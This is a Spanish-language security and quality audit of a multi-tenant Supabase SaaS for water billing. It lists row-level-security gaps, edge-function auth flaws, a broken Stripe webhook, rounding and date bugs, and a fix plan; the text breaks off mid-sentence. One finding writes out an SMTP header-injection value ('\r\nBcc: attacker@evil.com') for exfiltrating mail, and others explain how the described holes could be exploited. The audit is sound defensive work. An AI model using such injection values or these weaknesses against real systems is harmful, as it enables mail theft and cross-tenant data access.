# Auditoría de seguridad, funcionalidad y calidad — 2026-07-28

> **Alcance:** las 352 migraciones de `supabase/migrations/`, las 41 edge
> functions de `supabase/functions/`, el árbol completo de `src/`, y la
> configuración de CI/CD (`.github/workflows/`, `vercel.json`, `vite.config.ts`,
> `tsconfig.json`, `eslint.config.js`).
>
> Este documento es a la vez **hallazgos** y **plan de ejecución**: cada hallazgo
> lleva su PR asociado. Nada de lo aquí descrito está implementado todavía.
>
> Auditorías previas relacionadas: `AUDITORIA_INTEGRAL_2026-07-10.md`,
> `AUDITORIA_LOGICA_SAAS_2026-07-16.md`, `PLAN_EJECUCION_AUDITORIA_2026-07-16.md`.
> La sección «Ya está bien — no re-proponer» del Bloque F reconcilia qué items de
> esas auditorías siguen abiertos y cuáles ya se cerraron.

## Contexto

`control-consumo-agua` es un SaaS multi-tenant (React 18 + Vite 8 + TypeScript +
Supabase) para consumo de agua, condominios, cobros, contabilidad y facturación
fiscal: ~185k LOC en `src/`, 352 migraciones, 41 edge functions.

El repo ya pasó por varias auditorías (2026-04 → 2026-07) y **el trabajo de
seguridad previo es real y competente**: el endurecimiento de `search_path` está
al 100% (206 funciones `SECURITY DEFINER`, ninguna sin `SET search_path`), todos
los buckets de storage son privados, MFA se aplica en servidor con policies
`RESTRICTIVE`, no hay secretos en el bundle, la CSP no tiene `unsafe-eval`, y
`scripts/security-guard.mjs` vigila el catálogo de producción cada noche.

Por eso lo que queda **no son descuidos generales, sino regresiones y omisiones
puntuales**: migraciones de endurecimiento que arreglaron 8 de 11 tablas, o un
`CREATE OR REPLACE` posterior que borró en silencio un guard añadido seis días
antes. A eso se suman dos defectos de dinero verificados numéricamente y un flujo
de pago roto al 100%.

Prioridad acordada: **aislamiento multi-tenant primero**; dependencias `major` en
PR propio; troceado en **PRs pequeños**.

### Decisiones ya tomadas

- **Flujo Stripe por tenant:** arreglarlo completo (no retirarlo).
- **Migración `project_id` en 5 tablas:** se incluye en esta tanda, al final.

### Qué verifiqué de primera mano

No todo pesa igual. Estos los comprobé ejecutando código o leyendo la fuente de
la dependencia, no por inspección a ojo:

| Hallazgo | Verificación |
|---|---|
| A-1 · 3 tablas sin RLS | Parser sobre las 352 migraciones: 237 tablas con `ENABLE ROW LEVEL SECURITY`; `fuentes_agua`, `empresa`, `user_sessions` **no**. Contrastado con tablas de control |
| A-4 · guard perdido | Leí el cuerpo de la v2: es `LANGUAGE sql`, sin guard; y el `GRANT ... TO authenticated` sigue vivo en `20260603120000:71` |
| B-2 · Stripe siempre 403 | Descargué `stripe@13.10.0` y seguí `?target=deno` → `WebPlatformFunctions.js:35` → `SubtleCryptoProvider.js:17` (la ruta síncrona lanza siempre) |
| D-1 · `redondear2` | Fuerza bruta sobre 200.001 puntos medios: **4,58% redondean mal**; además **todo negativo** diverge de `numeric(12,2)` |
| D-2 · divergencia de mora | Comparé el TS contra el SQL del cron: difieren en base horaria **y** en columna de fallback |
| E-2 · tablas sin `project_id` | Contrastado contra `src/types/database.types.ts` (esquema real), no contra migraciones |

**Advertencia sobre métricas:** `node_modules/` no está en este checkout, así que
`type-check`, `lint` y `test` no se pudieron ejecutar (fallan por dependencias
ausentes, no por el código). CI sí los corre en limpio. **Antes de ejecutar el
plan: `npm ci` y correr la suite para fijar la línea base real.**

---

# Bloque A · Aislamiento multi-tenant en la base de datos

> Bloque de máxima prioridad. Ojo con el matiz de severidad: `security-guard.mjs`
> corre cada noche contra **producción** con un allowlist vacío y exige RLS +
> policy en toda tabla de `public`. Si está en verde, **prod está bien**. Lo que
> sigue es **drift repo↔prod**: cualquier deploy fresco, preview branch o staging
> provisionado desde el repo **sí** queda expuesto, y el repo no puede reproducir
> prod.

### PR-1 · Habilitar RLS en las 3 tablas que ninguna migración cubre 🔴

`fuentes_agua`, `empresa`, `user_sessions` se crean en
`20260317000001_baseline_legacy_tables_phase2.sql:53,80,89` y **ninguna de las 352
migraciones les habilita RLS**.

`20260610000808_fix_tenant_isolation_phase1.sql:166-173` existe exactamente para
cerrar esta clase de bug — su título dice *"prod ya tiene RLS en estas tablas,
pero el repo nunca la habilitaba → deploys frescos/staging quedaban expuestos"* —
y habilita RLS en 8 tablas. **Omite estas tres.**

Consecuencias por tabla:

- **`fuentes_agua`** tiene **8 policies que son código muerto**
  (`20260417000012:238`, `20260521000003:249,258,272`). Sin RLS, los grants por
  defecto de Supabase dan a `anon` y `authenticated` DML completo: con solo la
  anon key —que viaja en el bundle— se leen y escriben todas las filas de todos
  los tenants.
- **`user_sessions`** tiene una policy deny-all `USING(false)`
  (`20260318000002:16`) que **nunca se evalúa**. `sess` es un blob de sesión
  serializado (express-session): si quedan filas vivas, es toma de cuentas.
- **`empresa`** no tiene RLS ni policies. Menor sensibilidad (nombre, NIT), pero
  es lectura **y escritura** sin autenticar.

Firma clarísima de drift: `rlsHarness.test.ts:252-263` afirma que
`user_sessions` es deny-all y **pasa contra prod** — la aserción se cumple donde
RLS se habilitó a mano, y se cumpliría sin significar nada donde no.

Fix: una migración con los tres `ENABLE ROW LEVEL SECURITY` (o `DROP TABLE` para
`empresa`/`user_sessions`, ambas marcadas «legacy, no usada activamente» — hay
que confirmarlo antes), más añadir `fuentes_agua` a `ANON_DENY_TABLES` en el
harness.

### PR-2 · `user_module_permissions`: la rama `admin` no tiene predicado de tenant 🔴

`20260417000013_consolidate_rls_policies_part2.sql:480,491,501,518`

```sql
WITH CHECK (
  is_super_admin()
  OR (is_company_owner() AND user_id IN (
    SELECT id FROM app_users WHERE company_id = get_my_company_id()
  ))
  OR current_user_role() = 'admin'          -- ← sin predicado de tenant
);
```

La rama `company_owner` está bien acotada; la de `admin` **no tiene acotación
alguna**, y como las policies permisivas se combinan con OR, **se traga la rama
acotada**. El mismo defecto en `_select`, `_update` (en `USING` y en
`WITH CHECK`) y `_delete`. Verificado: ninguna migración posterior las redefine —
solo la baseline y ésta.

Un `admin` del tenant A puede conceder permisos de módulo a cuentas del tenant B,
revocar los del admin de B (denegación de servicio) y enumerar toda la tabla de
concesiones cross-tenant.

Fix: acotar la rama `admin` con la misma forma que la de `company_owner`.

### PR-3 · `clientes`: la policy de INSERT no valida el tenant 🔴

`20260327000003_fix_multi_project_and_company_visibility.sql:56-62`

```sql
CREATE POLICY "clientes_insert_by_role" ON public.clientes
  FOR INSERT TO authenticated
  WITH CHECK (
    current_user_role() IN ('super_admin','superadmin')
    OR current_user_role() IN ('company_owner','admin','operator','operador','user')
  );
```

Solo comprueba el rol: nunca `project_id`, nunca `company_clientes`. Rastreadas
las 11 migraciones que tocan `clientes`: `_select` y `_update` fueron
reemplazadas por versiones acotadas y `_delete` restringida, pero
**`clientes_insert_by_role` nunca se reemplazó** — es la policy de INSERT vigente.

Un `operator` (el rol de escritura más bajo) inserta una fila con `project_id` de
un proyecto del tenant B. Además de envenenar su listado, `clientes.codigo` es
`UNIQUE` y hay índice único parcial sobre `cui_dui` (`20260317000001:130`): se
pueden **ocupar códigos y DPIs reales**, bloqueando de forma permanente el alta
de esos clientes en el tenant B. Es una denegación de servicio cross-tenant
barata y difícil de diagnosticar.

Fix: reemplazar por una policy que exija
`project_id IN (SELECT p.id FROM projects p WHERE p.company_id = get_my_company_id())`.

### PR-4 · Restaurar el guard de `get_company_effective_limits` y hacerlo no-borrable 🟠

`20260606150000_secure_company_scoped_rpcs.sql` existe para arreglar lecturas
cross-tenant en tres RPCs con `p_company_id`, y documenta el hallazgo textualmente
(*"un usuario autenticado podía pasar el UUID de OTRA empresa y leer sus conteos,
límites de plan y total de facturación mensual"*).

Seis días después, `20260612210000_limits_effective_v2.sql:37` recrea **la misma
firma** para cambiar la semántica del límite, y la envía **sin el guard**:

```sql
CREATE OR REPLACE FUNCTION public.get_company_effective_limits(p_company_id uuid)
RETURNS TABLE(max_projects integer, max_units integer)
LANGUAGE sql STABLE SECURITY DEFINER SET search_path TO 'public'
AS $$ SELECT c.max_projects, c.max_units FROM public.companies c
      WHERE c.id = p_company_id LIMIT 1 $$;
```

`CREATE OR REPLACE` con firma idéntica **conserva el
`GRANT EXECUTE ... TO authenticated`** (`20260603120000:71`), así que la RPC sigue
siendo invocable y el guard simplemente desapareció. `get_company_usage` y
`calculate_monthly_total_cents` conservaron el suyo: solo ésta regresó.

Fix inmediato: re-añadir el guard. **Fix de proceso, que es lo que importa:**
extraer un helper `assert_company_scope(p_company_id)` que el cuerpo deba invocar,
para que una reescritura no pueda perderlo por omisión.

### PR-5 · `assert_company_scope()` en los RPCs de reportes contables 🟠

`conta_balance_general`, `conta_estado_resultados`, `conta_balanza_comprobacion`,
`conta_flujo_efectivo`, `conta_libro_mayor`, `conta_consolidado`,
`cxp_antiguedad_saldos`, `cxp_proyeccion_pagos`, `banco_estado_conciliacion`,
`presupuesto_partida_estado` reciben `(p_company_id, p_project_id, …)`, están
concedidas a `authenticated` y **no comprueban el scope del caller**.

Hoy son seguras **por accidente**: son `SECURITY INVOKER` y las tablas subyacentes
no tienen policy legible (ver PR-6). En cuanto alguien añada una policy permisiva
a `conta_asiento_lineas` —que es justo lo que PR-6 debe hacer— **todas se
convierten en divulgación cross-tenant de estados financieros**.

Por eso este PR va **antes** que PR-6. `banco_conciliar_movimiento`,
`conta_publicar_asiento`, `conta_anular_asiento` y `agua_cerrar_ciclo` ya lo
hacen bien: copiar esa forma.

### PR-6 · Policies faltantes en contabilidad / CxP / presupuesto / bancos 🟡

Con `ENABLE ROW LEVEL SECURITY` y **cero policies** en todo el corpus:
`conta_cuentas`, `conta_asientos`, `conta_asiento_lineas`, `conta_tipos_cambio`,
`conta_mapeo_cuentas` (`20260611000000:195-199`), `facturas_proveedor`,
`ordenes_pago` (`20260611010000:132-133`), `presupuestos`,
`presupuesto_partidas` (`20260611020000:60-61`), `cuentas_bancarias`,
`banco_movimientos` (`20260611030000:74-75`), `security_logs`
(`20260610000808:173`).

Es **fail-closed, así que no es vulnerabilidad en sí** — pero significa que el
repo no reproduce prod. Añadir las policies acotadas por tenant, o una deny-all
`AS RESTRICTIVE` explícita con comentario, para que la intención sea auditable.

### PR-7 · Acotar el SELECT de los buckets de logos 🟡

`20260417000010_fix_security_warnings.sql:47`

```sql
CREATE POLICY "logos_authenticated_select" ON storage.objects
  FOR SELECT TO authenticated
  USING (bucket_id IN ('company-logos','project-logos'));
```

Más `20260516000006:14,35`, también solo por `bucket_id`. Las migraciones
`20260603150000`/`20260603170000` sí acotaron INSERT/UPDATE/DELETE por
`(storage.foldername(name))[1] = get_my_company_id()::text`, pero dejaron el
SELECT abierto a propósito. Como las policies permisivas se combinan con OR,
**cualquier usuario autenticado lista y descarga los logos de todos los tenants y
proyectos**, y de paso mapea el espacio de UUIDs. Esto anula buena parte del
trabajo de volver privados esos buckets.

### PR-8 · Fijar en SQL la configuración de `condominios-media` y `mudanza-docs` 🟡

El repo solo tiene
`UPDATE storage.buckets SET public=false WHERE id IN (...)` (`20260516000003:103`).
**No hay `INSERT INTO storage.buckets`** para ninguno de los dos, ni nada que fije
`file_size_limit` o `allowed_mime_types`. `20260603230000:3` *afirma* que ya están
restringidos, pero ninguna migración lo hace — se configuró desde el dashboard.

Son los buckets más sensibles del producto: guardan
`huespedes_str.foto_documento_url` y `visitantes.foto_documento_url` (escaneos de
documento de identidad), `novedades_seguridad.fotos` y
`solicitud_mudanza_unidad.imagenes`. Y el propio código documenta el riesgo
residual en `src/lib/fileValidation.ts:9-14`: un usuario autenticado puede saltarse
la validación del cliente llamando a la REST API de Storage directamente.

Fix: `INSERT ... ON CONFLICT (id) DO UPDATE` idempotente fijando `public=false`,
límite de tamaño y allowlist de MIME — como ya hace bien
`20260605170000_calidad_reportes_storage.sql:35`.

*(El scoping por objeto de estos buckets sí está bien hecho —
`20260603220000:51-116`, `20260603180000:33-58`—; falta solo la config de bucket.)*

### PR-9 · Guard estático de migraciones en CI 🟡

`security-guard.mjs` valida **prod**, que es justo donde el drift no se ve. Añadir
un chequeo estático sobre `supabase/migrations/` que falle en PR ante:

1. cualquier `CREATE TABLE public.*` sin su `ENABLE ROW LEVEL SECURITY`;
2. cualquier función `SECURITY DEFINER` concedida a `authenticated` con parámetro
   `p_company_id`/`p_project_id` y sin llamada a `assert_company_scope()`.

**Tanto PR-1 como PR-4 se habrían atrapado en el PR que los introdujo.** Este es
el PR con mejor relación coste/beneficio del bloque.

### PR-10 · Detalles menores de DB 🟢

- Los vaults de secretos usan deny-all **PERMISSIVE** `USING(false)`
  (`company_payment_secrets` `20260409000004:5`, `payfac_secrets`
  `20260604233000:173`, `fiscal_pac_secrets` `20260604230000:218`): una policy
  permisiva futura pasaría por encima con un OR. `company_whatsapp_configs`
  (`20260716000000:75`) lo hace bien con `AS RESTRICTIVE` — alinear las otras tres.
- `get_my_company_id()` sin `LIMIT 1` (`20260320000003:14`), mientras
  `get_my_cliente_id()` sí lo tiene. Falla cerrado, pero es inconsistente.
- Catálogo `permissions` legible por cualquier autenticado (`20260518000016:246`).

---

# Bloque B · Seguridad crítica — edge functions

### PR-11 · `CRON_SECRET` en tiempo constante y re-derivación del scope en `send-email` 🔴

`supabase/functions/send-email/index.ts:377-390,431`

```ts
const internalRetry = cronSecret.length > 0
  && req.headers.get('x-internal-retry') === cronSecret   // :379 — no es tiempo constante
...
if (internalRetry) { userId = req.headers.get('x-triggered-by') ?? '' }  // :390
...
if (!internalRetry) {   // :431 — se salta TODO el bloque de autorización
```

Con la ruta interna activa, `company_id` e `is_superadmin` salen del body sin
validar contra `app_users`. Quien obtenga `CRON_SECRET` consigue un **open
relay**: correo arbitrario desde la cuenta Gmail de cualquier tenant o del
superadmin, con `triggered_by` falsificado. `verify_jwt` no protege: se satisface
con la anon key pública.

Agrava que `CRON_SECRET` es **un único secreto compartido por 5 funciones** y tres
lo comparan con `===`: `send-email:379`, `process-email-queue:157`,
`sync-stripe-quantities:195`. `notifications-dispatcher:508` y
`backfill-tenant-secrets:106` sí usan `timingSafeEqualSecret`. El propio repo
documenta este ataque en `_shared/auth.ts:147-152`.

### PR-12 · Arreglar el webhook de Stripe por tenant 🔴

`supabase/functions/stripe-webhook-handler/index.ts:40,101-112`

```ts
const stripe = await import('https://esm.sh/stripe@13.10.0?target=deno')  // :40
event = Stripe.webhooks.constructEvent(body, signature, webhookSecret)    // :101 — SÍNCRONA
} catch (err) { continue }                                                // :109-112 — se traga el error
```

Con `?target=deno`, esm.sh resuelve el build web →
`createDefaultCryptoProvider()` devuelve `SubtleCryptoProvider` →
`computeHMACSignature` **síncrono lanza siempre**. La excepción se produce para
cada secreto de empresa, el `catch` silencioso continúa el bucle, se agotan todos
y la función devuelve **`403 Invalid signature` en el 100% de los casos**. Un fallo
real de firma y uno de runtime son indistinguibles.

Alcance real: `create-payment-intent` **no tiene llamador en `src/`** (solo figura
como nombre monitoreado en `src/lib/monitoring.ts:40`); el cobro vivo va por
`create-charge` (QPayPro), que está limpio. Es un P0 sobre un flujo dormido pero
**desplegado y alcanzable**.

Cambios: `constructEventAsync` (patrón de `stripe-platform-webhook:314`), dedupe
por `event.id` contra `stripe_webhook_events`, no tragarse el error de
verificación, y **hacer visible el error del insert de `pagos`**. Nótese que
`pagos.stripe_payment_intent_id` ya es `UNIQUE`
(`20260317000000_baseline_legacy_tables_phase1.sql:195`), así que el replay no
duplica cobros — pero hoy falla en silencio. Además el bucle prueba el secreto de
**todas** las empresas en cada petición: un escaneo HMAC O(n) sin autenticar.

### PR-13 · `create-payment-intent`: validar pertenencia de `registro_id`/`cliente_id` 🟠

`index.ts:107-126,215-229` valida **solo** `company_id` contra el perfil del
caller; `registro_id` y `cliente_id` pasan directos a `payment_requests`, sin
ningún gate de rol. `create-charge/index.ts:238-284` sí resuelve la empresa dueña
del registro — copiar ese patrón. Va junto a PR-12: al arreglar el webhook, este
hueco pasa de latente a explotable.

### PR-14 · `sso-admin`: exigir dominio verificado antes de registrar el IdP 🟠

`supabase/functions/sso-admin/index.ts:168-199`

`save_metadata` lee la fila (`:169-176`) pero **nunca comprueba `row.verified`**
antes de `POST /auth/v1/admin/sso/providers` con `domains: [domain]`.
`upsert_domain` (`:82-105`) tampoco exige prueba de propiedad y la verificación
está explícitamente parqueada (`:160-163`).

La DB sí defiende — `CHECK (NOT enforced OR verified)` y `sso_lookup_domain` solo
anuncia dominios verificados (`20260606130000:79-80,185`) — pero **el mapeo
dominio→IdP en GoTrue es independiente de esa tabla**, así que esta ruta esquiva
ambos gates. Como nada marca `verified=true` hoy, el riesgo se arma en cuanto SSO
se habilite a nivel de proyecto.

### PR-15 · Inyección de cabeceras SMTP vía `to_email` 🟠

`send-email/index.ts:92`, `notifications-dispatcher/index.ts:154`,
`notify-package/index.ts:87`, `route-reminders/index.ts:85`

`To: ${to}` se interpola crudo — `subject` y `from_name` sí van en base64.
`to_email` solo se comprueba por *truthiness* (`send-email:407`). Un `operator`
inyecta `\r\nBcc: attacker@evil.com` y exfiltra correo desde la identidad Gmail
verificada del tenant. Fix: helper compartido que rechace `[\r\n]`, usado en los 4
sitios.

---

# Bloque C · Seguridad media — edge functions

| PR | Cambio | Ubicación |
|---|---|---|
| **PR-16** | Rate limit en `log-security-event` (anónima, sin límite ni validación de origen → envenenamiento anti-forense del log con `details` JSON controlado), `send-email` (sin límite alguno) y `google-oauth-callback` | `log-security-event/index.ts:59-110` |
| **PR-17** | Dejar de devolver texto de excepción y de Postgres al cliente (~15 funciones). Genérico al cliente + detalle a Sentry, como ya hacen `create-user:204` / `delete-user:205` | `google-oauth-callback:172-176`, `signup-company:280`, `send-email:598`, vaults |
| **PR-18** | Borrar las 9 copias inline de `getAllowedOrigins` y usar `_shared/cors.ts`. La de `create-payment-intent:8-19` está **desactualizada** (sin dominios de producción): si `ALLOWED_ORIGINS` falta, 403ea producción y responde `Allow-Origin: http://localhost:5173` | 9 funciones |
| **PR-19** | `create-cliente-account`: añadir validación de origen y **dejar de resetear la contraseña** de un auth user huérfano con solo DPI + fecha de nacimiento + email (datos impresos en la factura) | `create-cliente-account/index.ts:45-65,178-214` |
| **PR-20** | Añadir al workflow de deploy las **10 funciones que están en `config.toml` pero no en él** (su postura `verify_jwt` depende de despliegues manuales), y `permissions:` a los **7 workflows que no lo tienen** (`ci`, `coverage`, `apply-migration`, `deploy-functions`, `deploy-staging`, `edge-tests`, `promote-production`) | `.github/workflows/` |
| **PR-21** | `enforceRateLimit` es **fail-open**: un error del RPC desactiva en silencio todos los límites del repo. Evaluar fail-closed en las rutas anónimas | `_shared/rateLimit.ts:80` |

**Acción de operador, no PR:** `_shared/secretsCrypto.ts:108-112` hace passthrough
si falta `TENANT_SECRETS_ENC_KEY` → los secretos de Stripe/PAC/Gmail/WhatsApp
quedarían **en claro**. Verificar que la clave está provisionada y que
`backfill-tenant-secrets` ya corrió (`docs/RUNBOOK_TENANT_SECRETS_ENCRYPTION.md`).

**Sin hallazgos:** no hay SSRF en ninguna función (los hosts de fiscal y payfac son
constantes o vienen de env, nunca del tenant). Limpios y **no re-auditar**: los
vaults de credenciales, la ruta de dinero viva (`create-charge`, `confirm-charge`),
`stripe-platform-webhook`, gestión de usuarios (`create-user`, `delete-user`,
`delete-company`, `invite-user`, `accept-invitation`), los workers de cron,
`validate-upload`, `create-broadcast`, `complete-oauth-onboarding` y todos los
helpers de `_shared/`.

---

# Bloque D · Correctitud de dinero

### PR-22 · `redondear2`: una sola implementación, y correcta 🔴

`src/lib/business.ts:257-262`

```ts
// Epsilon para neutralizar el error de coma flotante...  1.005 debe dar 1.01
return Math.round((n + Number.EPSILON) * 100) / 100
```

`Number.EPSILON` es el ulp **en 1.0** — un empujón absoluto contra un error que
escala con la magnitud. Medido por fuerza bruta sobre 200.001 puntos medios:

- **9.158 (4,58%) redondean hacia abajo** en vez de half-up: `2.135→2.13`,
  `4.015→4.01`, `10.075→10.07`.
- Por encima de ~1000 el epsilon es inoperante:
  `(1000.005 + Number.EPSILON) === 1000.005` es `true`.
- **Segundo defecto, independiente:** el comentario promete *"round half away from
  zero para casar con numeric de Postgres"*, pero `Math.round` es half-**up**, así
  que **todo punto medio negativo diverge de la columna**: `-1.005` → `-1.00` (TS)
  vs `-1.01` (Postgres). Afecta notas de crédito, ajustes y reversos, y además
  produce `-0`.

Impacta IVA (`:300`), mora (`:390`), totales de factura (`:436`) y montos por
cuota (`:483-489`), donde `generarCalendarioConvenio` fuerza a la última cuota a
absorber el residual — el error se **concentra** en vez de cancelarse.

Fix: escala decimal-corregida con signo explícito, vectores de test para puntos
medios y negativos, y **borrar las 6 copias**: `businessFiscal.ts:269` ·
`businessPagos.ts:101` · `domain/contabilidad/schemas.ts:8` ·
`domain/contabilidad/arbol.ts:69` · `domain/eeff/calculos.ts:4` ·
`domain/presupuesto/schemas.ts:23`.

### PR-23 · Alinear el cálculo de mora del UI con el cron que realmente cobra 🔴

`src/components/condominios/tabs/RecargosTab.tsx:56-65`

```ts
hoy: string = new Date().toISOString().slice(0, 10),   // medianoche UTC
const ms = new Date(hoy).getTime() - new Date(base).getTime()
return Math.max(0, Math.floor(ms / 86_400_000))
```

Diverge del cron en **dos ejes**:

1. **Base horaria.** `base` es `emitida_at`, un `timestamptz` con hora real
   (`20260604160000:106`); `hoy` es medianoche UTC. El SQL usa
   `EXTRACT(EPOCH FROM (v_now - ...))` con `v_now = now()`, dos instantes completos
   (`20260604170000_aplicar_mora_cron.sql:179`).
2. **Columna de fallback.** El TS usa
   `COALESCE(emitida_at, created_at, fecha_vencimiento)`; el SQL usa
   `COALESCE(emitida_at, reg.fecha)`. El comentario del TS afirma que son «misma
   derivación» — no lo son.

La vista previa y el cargo efectivo cruzan el umbral
`dias_vencimiento + periodo_gracia` en momentos distintos. **Un residente que
dispute el recargo tendrá razón.** Fix: replicar la base del SQL y añadir un test
que fije ambos juntos.

### PR-24 · Barrido de fechas locales 🟠

`src/lib/format.ts:44-55` **ya trae** `dateLocalISO`/`hoyLocalISO`, con un
comentario que dice literalmente que en GMT-6 después de las 18:00 «ya es mañana»
y la lectura caía al ciclo de facturación equivocado. La auditoría de julio cerró
esto como E4/D5: **el helper aterrizó, la migración nunca ocurrió.**

- **42 ocurrencias** de `new Date().toISOString().split('T')[0]` en 25 archivos;
  solo 6 archivos importan el helper. Sitios con dinero: `ConvenioModal.tsx:34,61`
  (primera cuota de un convenio), `CobrosSection.tsx:555` (KPI «Pagos Hoy»),
  `PagosHistorial.tsx:19-20`, `CargosAdicionalesTab.tsx:40,76`,
  `GestionCobranzaTab.tsx:50,98,101,108`, `RecargosTab.tsx:75`.
- **~14 helpers duplicados de diferencia de días**, todos con el mismo off-by-one:
  `new Date('YYYY-MM-DD')` parsea como **medianoche UTC** y se compara contra un
  instante local → ±1 día en GMT-6. Los peores mueven decisiones de cobranza:
  `AnalisisCarteraTab.tsx:19` y `ReporteDeudoresTab.tsx:25` (`diasVencido`,
  alimenta los buckets de antigüedad), `GestorAlertasTab.tsx:47,51`.

  El idioma correcto **ya se usa en la misma carpeta** (`RevisionTareasTab.tsx:140`,
  `BitacoraEventosTab.tsx:205` anclan a `T12:00:00`): es inconsistencia, no
  desconocimiento.

Fix: `hoyLocalISO()` en los 42 sitios; un `diasEntre()` en `src/lib/format.ts`
sobre el `parseFecha` existente (`format.ts:30-34`, que ya ancla a T12:00:00) y
borrar las 14 copias; regla `no-restricted-syntax` para que no regrese.

### PR-25 · Paginación en los libros de dinero 🟠

**419 `.select()` frente a 13 `.range()`.** `fetchAllRows` (`src/lib/fetchAllRows.ts`)
y `runQueryAll` (`src/domain/queryFetch.ts:66`) están bien hechos pero se usan en
**3 módulos**. Los libros truncan en silencio:
`domain/contabilidad/queries.ts:73` (`.limit(500)` sobre **asientos contables** — un
tenant con >500 obtiene un libro incorrecto sin aviso), `:170` (`.limit(200)`),
`domain/cxp/queries.ts:45,63`, `domain/bancos/queries.ts:40`. Y sin límite alguno
—cayendo al techo silencioso de 1000 de PostgREST— `sectionData.ts:128,131,133,136`.

---

# Bloque E · Aislamiento por proyecto en la aplicación

### PR-26 · `bitacora_acciones` filtra solo por empresa 🟠

`src/domain/condominios/sectionData.ts:182` filtra por `company_id` aunque **la
tabla sí tiene `project_id`** (confirmado en los tipos generados). En un tenant con
varios condominios, cada proyecto muestra la bitácora de todos. Fix de una línea.

### PR-27 · Añadir `project_id` a 5 tablas de condominio 🟠

Verificado contra `src/types/database.types.ts` (esquema real): `movimientos_caja`,
`cuotas_plan_pago`, `reservas_amenidades`, `movimientos_suministro`,
`registro_asistentes_evento` tienen **solo `company_id`**. Las dos primeras son
dinero: un tenant multi-condominio ve los movimientos de caja y las cuotas de plan
de pago de un proyecto dentro de la vista de otro
(`sectionData.ts:53,76,131,133,136,159`).

No se puede arreglar en la query: requiere migración con `project_id`, backfill,
predicado RLS y filtros. **Es el PR más grande del plan; va el último y solo.**

---

# Bloque F · Errores silenciosos y calidad

| PR | Cambio | Detalle |
|---|---|---|
| **PR-28** | Enrutar por `runQuery` los **26 sitios que descartan el `error` de Supabase** | Patrón `const { data } = await supabase…`, codificado como *"Degrada a []"*. Una caída de red o una denegación de RLS es indistinguible de «no hay registros»: el usuario ve una tabla vacía y se lo cree. Peor archivo: `domain/clientes/queries.ts:18,37,73,91,101`. `runQuery` (`domain/queryFetch.ts:38`) ya lanza, así que React Query expone `isError` |
| **PR-29** | ESLint: ampliar alcance y encender reglas | Hoy las reglas aplican **solo a `src/components/**`** (`eslint.config.js:27`): `src/domain`, `src/lib` y `src/hooks` están **sin lint**. Solo hay 2 reglas activas. `react-hooks/exhaustive-deps` está en **`'off'`** (`:42`) con **26 supresiones vivas** que nunca se revalidan porque `reportUnusedDisableDirectives` también está `'off'` (`:31`). `typescript-eslint` es dependencia pero **ninguna** de sus reglas está activa. Poner `exhaustive-deps: 'warn'`, activar `no-floating-promises`, ampliar `files` |
| **PR-30** | Incluir `supabase/functions/**` en el type-check | `tsconfig.json` tiene `include: ["src"]`, así que **toda la ruta de dinero del servidor** (`create-charge`, `confirm-charge`, `timbrar-documento`) nunca se typechequea. El único `deno check` es `continue-on-error: true` y solo cubre «helpers puros» (`edge-tests.yml:56,65,75`) |
| **PR-31** | Extender el umbral de cobertura a `src/domain/**` de dinero | El gate cubre **12 archivos de `src/lib/`** (`coverage.yml:38-75`). Ningún archivo de `src/domain/**` tiene umbral — es toda la capa de queries/mutations. Empezar por `eeff` (1 test / 4 archivos) y `contabilidad` (3 / 5) |

**Corrección a una hipótesis previa:** no hay dominios de dinero sin tests — todos
tienen (facturacion 3, cobros 4, contabilidad 3, fiscal 3, presupuesto 3, bancos 2,
cxp 2, tarifas 1, eeff 1). Los dominios con cero tests son no-monetarios
(`branding`, `legal`, `preferencias`, `sesiones`). Ratio global: 179 archivos de
test / 707 fuente.

**Ya está bien — no re-proponer:** 9 `as any` en 185k LOC y cero `@ts-ignore`;
React Query invalida en los 17 archivos con `useMutation` y **no hay fuga de caché
entre tenants**; el logout purga `queryClient` y Cache Storage (`useAuth.ts:60-66`);
ErrorBoundary a nivel raíz y por sección; Sentry bien cableado (`tracesSampler` al
100% en pago/auth, `sendDefaultPii: false`); `tsconfig` con `strict: true`; sesión
en `sessionStorage`, no `localStorage`; `printHtml.ts` es un escapador correcto y
los 11 `document.write` están cubiertos; `sanitizeUploadFilename` previene path
traversal; la escalada de privilegios en `app_users` está cerrada con trigger y
policies; MFA es `RESTRICTIVE` en servidor sobre 10 tablas.

---

# Bloque G · Dependencias

### PR-32 · Absorber react-router-dom 6 → 7

`npm audit` reporta **22 vulnerabilidades (19 high, 3 moderate)** y `npm audit fix`
sin `--force` **no resuelve ninguna**. La única con exposición real de producción es
el **open redirect de React Router** (GHSA-wrjc-x8rr-h8h6, bypass de CVE-2025-68470);
el resto de la cadena (`exceljs`→`archiver`, `eslint`→`minimatch`) es build/dev-time.

Ya existe **#661** de Dependabot; este PR lo absorbe añadiendo la migración de
código que v7 requiere. Los otros PRs abiertos (#663 eslint 10, #662 sonner 2,
#670 grupo minor/patch, #659 checkout 7) siguen su flujo — salvo que PR-29 choque
con #663, en cuyo caso se ordenan.

---

# Orden de ejecución

1. **PR-9** (guard estático en CI) — primero, para que lo demás no regrese.
2. **PR-1, PR-2, PR-3** — aislamiento multi-tenant; los tres son diffs pequeños.
3. **PR-4**, luego **PR-5**, luego **PR-6** — en ese orden: PR-5 debe aterrizar
   **antes** que PR-6 o se abre la divulgación cross-tenant de estados financieros.
4. **PR-11** (bypass de auth) y **PR-22** (`redondear2`) — máximo riesgo y máxima
   corrección por línea, respectivamente.
5. **PR-23** (mora) — disputable por un cliente hoy.
6. **PR-14, PR-15, PR-26** — cierres quirúrgicos; luego **PR-29** (lint).
7. **PR-24, PR-28, PR-25** — barridos amplios.
8. **PR-12 + PR-13** juntos (Stripe); **PR-7, PR-8, PR-10, PR-16…PR-21, PR-30,
   PR-31** — endurecimiento.
9. **PR-32**, y por último **PR-27** (migración, solo y al final).

---

# Verificación

**Antes de empezar:** `npm ci`, luego `npm run type-check`, `npm run lint` y
`npm run test` para fijar la línea base real.

- **Bloques A/E (base de datos).** `node scripts/security-guard.mjs` tras cada
  migración. Para PR-1, un test que confirme que `anon` **no** puede leer
  `fuentes_agua` (hoy ese test pasaría contra prod y fallaría contra un deploy
  fresco — ésa es exactamente la prueba que falta). Para PR-2/PR-3, sembrar dos
  tenants y afirmar que A no puede insertar ni leer filas de B.
  `src/test/rls/rlsHarness.test.ts` existe pero **nunca corre** (gated por
  `RLS_SUPABASE_URL`/`RLS_USER_A/B_*`): **PR-27 es la ocasión de activarlo**.
- **Bloques B/C (edge functions).** `npx vitest run --dir supabase/functions` (el
  gate real, ver `edge-tests.yml`). Para PR-12, un test que construya una firma
  HMAC válida y compruebe que se acepta — **hoy ese test falla en rojo, y ése es
